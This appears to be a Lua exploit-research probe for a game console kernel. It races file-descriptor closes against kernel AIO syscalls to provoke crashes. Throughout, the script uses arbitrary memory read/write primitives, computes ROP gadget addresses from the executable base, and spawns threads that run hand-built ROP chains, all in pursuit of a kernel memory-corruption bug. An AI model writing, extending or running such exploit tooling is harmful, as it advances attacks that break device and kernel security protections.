-- CRASH_CLASS: HIGH
-- PROBE 69o2: Close underlying fd during AIO 663 wait / 664 poll
--
-- Different vector from 69o (poll vs delete): here we close the FILE
-- DESCRIPTOR that AIO is operating on while AIO operations are in progress.
--
-- Vectors:
--   [A] Close completed AIO fd, then status/delete
--   [B] Close fd with PENDING AIO request, then complete + check
--   [C] Fd reuse: close AIO fd → reopen → does AIO see new file?
--   [D] Child close vs main poll (10 rounds)
--   [E] 663 wait + fd close: child blocked in 663, main closes fd

print("=== PROBE 69o2: FD CLOSE DURING AIO ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end

local pid = N(mk(20)())
print("pid=" .. pid)
local function alive() return N(mk(20)()) == pid end

-- Ignore SIGSYS
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), uint64(N(sa_buf)), uint64(0)) end)

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local data_buf = memory.alloc(256)
local result_buf = memory.alloc(64)

local function aio_submit(fd)
    local req = memory.alloc(0x28)
    wq(N(req) + 0x00, uint64(0))
    wq(N(req) + 0x08, uint64(16))
    wq(N(req) + 0x10, uint64(N(data_buf)))
    wq(N(req) + 0x18, uint64(N(result_buf)))
    wq(N(req) + 0x20, uint64(fd))
    local id_out = memory.alloc(8); wd(N(id_out), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(id_out)))
    end)
    return rd(N(id_out)) or 0
end

local function aio_poll(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(664)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_status(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(666)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_delete(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(662)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

-- Get eboot for gadgets
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tb_lo = rd(N(info) + 0x108) or 0
local tb_hi = rd(N(info) + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", tb_hi, tb_lo))
print(string.format("eboot=0x%X%08X", tb_hi, tb_lo))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local bare_ret    = eboot + uint64(0x42)
local mov_rdi_rax = eboot + uint64(0x92C67)

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local syscall_fn = fn_str and uint64(fn_str) or uint64(0)
print("fn_addr=" .. tostring(syscall_fn))

local STACK_SIZE = 0x200000
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end

local function spawn_child(chain)
    local stack = memory.alloc(STACK_SIZE)
    local rsp = N(stack) + STACK_SIZE - 8
    for i, qw in ipairs(chain) do
        wq(rsp + (i - 1) * 8, qw)
    end
    local param = memory.alloc(0x40)
    wq(N(param) + 0x00, pop_rax_ret)
    wq(N(param) + 0x08, uint64(0))
    wq(N(param) + 0x10, uint64(N(stack)))
    wq(N(param) + 0x18, uint64(STACK_SIZE))
    wq(N(param) + 0x30, uint64(0))
    pcall(function() mk(455)(uint64(N(param)), uint64(0x38)) end)
end

local function sysarch_prefix()
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), uint64(N(fake_tcb)))
    return {
        pop_rax_ret, uint64(165),
        pop_rdi_ret, uint64(129),
        pop_rsi_ret, uint64(N(tcb_ptr)),
        syscall_fn, bare_ret,
    }
end

local function exit_chain()
    return {
        pop_rax_ret, uint64(431),
        pop_rdi_ret, uint64(0),
        syscall_fn,
    }
end

-- ============================================================
-- [A] Close completed AIO fd, then status/delete
-- ============================================================
print("")
print("[A] Close completed AIO fd")

local fd_a = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
local id_a = aio_submit(fd_a)
aio_poll(id_a)
print(string.format("  fd=%d id=0x%X polled", fd_a, id_a))

pcall(function() mk(6)(uint64(fd_a)) end)
local st_a = aio_status(id_a)
local del_a = aio_delete(id_a)
print(string.format("  after close: status=0x%08X delete=0x%08X",
    st_a or 0, del_a or 0))
if not alive() then print("DEAD"); return end
print("")

-- ============================================================
-- [B] Close fd with PENDING AIO, then trigger completion
-- ============================================================
print("[B] Close fd with pending AIO")

local sp_b = memory.alloc(16)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_b))) end)
local b0 = rd(N(sp_b)) or -1
local b1 = rd(N(sp_b) + 4) or -1

local id_b = aio_submit(b0)
local st_b1 = aio_status(id_b)
print(string.format("  sp0=%d sp1=%d id=0x%X pending_st=0x%08X", b0, b1, id_b, st_b1 or 0))

pcall(function() mk(6)(uint64(b0)) end)
print("  sp0 closed")

local st_b2 = aio_status(id_b)
print(string.format("  status_after_close=0x%08X", st_b2 or 0))

pcall(function() mk(4)(uint64(b1), uint64(N(data_buf)), uint64(16)) end)
local st_b3 = aio_status(id_b)
print(string.format("  status_after_write=0x%08X", st_b3 or 0))

local poll_b = aio_poll(id_b)
local del_b = aio_delete(id_b)
print(string.format("  poll=0x%08X del=0x%08X", poll_b or 0, del_b or 0))

pcall(function() mk(6)(uint64(b1 or 0)) end)
if not alive() then print("DEAD"); return end
print("")

-- ============================================================
-- [C] Fd reuse: close AIO fd → reopen → does AIO see new file?
-- ============================================================
print("[C] Fd reuse test")

local sp_c = memory.alloc(16)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_c))) end)
local c0 = rd(N(sp_c)) or -1
local c1 = rd(N(sp_c) + 4) or -1

local id_c = aio_submit(c0)
print(string.format("  sp0=%d id=0x%X pending", c0, id_c))

pcall(function() mk(6)(uint64(c0)) end)
local fd_new = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print(string.format("  closed sp0, reopened /dev/zero → fd=%d (reuse=%s)",
    fd_new, fd_new == c0 and "YES" or "NO"))

local st_c = aio_status(id_c)
local poll_c = aio_poll(id_c)
local del_c = aio_delete(id_c)
print(string.format("  st=0x%08X poll=0x%08X del=0x%08X", st_c or 0, poll_c or 0, del_c or 0))

pcall(function() mk(6)(uint64(c1 or 0)) end)
pcall(function() mk(6)(uint64(fd_new or 0)) end)
if not alive() then print("DEAD"); return end
print("")

-- ============================================================
-- [D] Child close vs main poll (10 rounds)
-- ============================================================
print("[D] Child close + main poll (10 rounds)")

local anom_d = 0
for r = 1, 10 do
    if not alive() then print("DEAD at round " .. r); return end

    local fd = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
    if fd < 0 then break end

    local aid = aio_submit(fd)
    if aid == 0 then pcall(function() mk(6)(uint64(fd)) end); break end
    aio_poll(aid)

    local marker = memory.alloc(16); wd(N(marker), 0xBEEF)

    local sa = sysarch_prefix()
    local chain = {}
    for _, v in ipairs(sa) do chain[#chain + 1] = v end
    -- close(fd)
    chain[#chain + 1] = pop_rax_ret
    chain[#chain + 1] = uint64(6)
    chain[#chain + 1] = pop_rdi_ret
    chain[#chain + 1] = uint64(fd)
    chain[#chain + 1] = syscall_fn
    chain[#chain + 1] = bare_ret
    -- write marker
    chain[#chain + 1] = pop_rax_ret
    chain[#chain + 1] = uint64(0xD00D)
    chain[#chain + 1] = pop_rdi_ret
    chain[#chain + 1] = uint64(N(marker))
    chain[#chain + 1] = mov_rdi_rax
    local ex = exit_chain()
    for _, v in ipairs(ex) do chain[#chain + 1] = v end

    spawn_child(chain)

    local st = aio_status(aid)
    local del = aio_delete(aid)

    local w = 0
    while rd(N(marker)) ~= 0xD00D and w < 100 do w = w + 1 end

    local ok_vals = {[0]=true, [3]=true, [0x00000003]=true, [0x00010003]=true, [0x80020003]=true}
    if not ok_vals[st or 0] then anom_d = anom_d + 1 end

    print(string.format("  r%02d: st=0x%08X del=0x%08X child=%s",
        r, st or 0, del or 0, rd(N(marker)) == 0xD00D and "OK" or "STUCK"))
end
print(string.format("  anomalies: %d/10", anom_d))
if not alive() then print("DEAD"); return end
print("")

-- ============================================================
-- [E] 663 wait + fd close: child waits, main closes fd
-- ============================================================
print("[E] 663 wait + fd close (5 rounds)")

local anom_e = 0
for r = 1, 5 do
    if not alive() then print("DEAD at round " .. r); return end

    local sp = memory.alloc(16)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local e0 = rd(N(sp)) or -1
    local e1 = rd(N(sp) + 4) or -1
    if e0 < 0 then break end

    local aid = aio_submit(e0)
    if aid == 0 then
        pcall(function() mk(6)(uint64(e0 or 0)) end)
        pcall(function() mk(6)(uint64(e1 or 0)) end)
        break
    end

    local marker = memory.alloc(16); wd(N(marker), 0xBEEF)
    local oid_buf = memory.alloc(8); wd(N(oid_buf), aid)
    local ost_buf = memory.alloc(8); wd(N(ost_buf), 0xDEAD)

    local sa = sysarch_prefix()
    local chain = {}
    for _, v in ipairs(sa) do chain[#chain + 1] = v end
    -- 663(oid, 1, ost)
    chain[#chain + 1] = pop_rax_ret
    chain[#chain + 1] = uint64(663)
    chain[#chain + 1] = pop_rdi_ret
    chain[#chain + 1] = uint64(N(oid_buf))
    chain[#chain + 1] = pop_rsi_ret
    chain[#chain + 1] = uint64(1)
    chain[#chain + 1] = pop_rdx_ret
    chain[#chain + 1] = uint64(N(ost_buf))
    chain[#chain + 1] = syscall_fn
    chain[#chain + 1] = bare_ret
    -- marker
    chain[#chain + 1] = pop_rax_ret
    chain[#chain + 1] = uint64(0xE663)
    chain[#chain + 1] = pop_rdi_ret
    chain[#chain + 1] = uint64(N(marker))
    chain[#chain + 1] = mov_rdi_rax
    local ex = exit_chain()
    for _, v in ipairs(ex) do chain[#chain + 1] = v end

    spawn_child(chain)

    -- Let child enter 663 and block
    local w = 0
    while w < 30 do w = w + 1 end

    -- Close the fd while 663 is blocked
    pcall(function() mk(6)(uint64(e0)) end)

    -- Trigger completion by writing to sp1
    pcall(function() mk(4)(uint64(e1), uint64(N(data_buf)), uint64(8)) end)

    -- Wait for child
    w = 0
    while rd(N(marker)) ~= 0xE663 and w < 300 do w = w + 1 end

    local done = rd(N(marker)) == 0xE663
    local wst = rd(N(ost_buf))

    local ok_vals = {[0x00000003]=true, [0x80020003]=true, [0x00010003]=true, [0xDEAD]=true}
    if not done then
        -- stuck is notable
    elseif not ok_vals[wst or 0] then
        anom_e = anom_e + 1
    end

    print(string.format("  r%d: child=%s wait_st=0x%08X",
        r, done and "DONE" or "STUCK", wst or 0))

    pcall(function() aio_delete(aid) end)
    pcall(function() mk(6)(uint64(e1 or 0)) end)
end
print(string.format("  anomalies: %d/5", anom_e))
if not alive() then print("DEAD"); return end
print("")

print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69o2 COMPLETE ===")
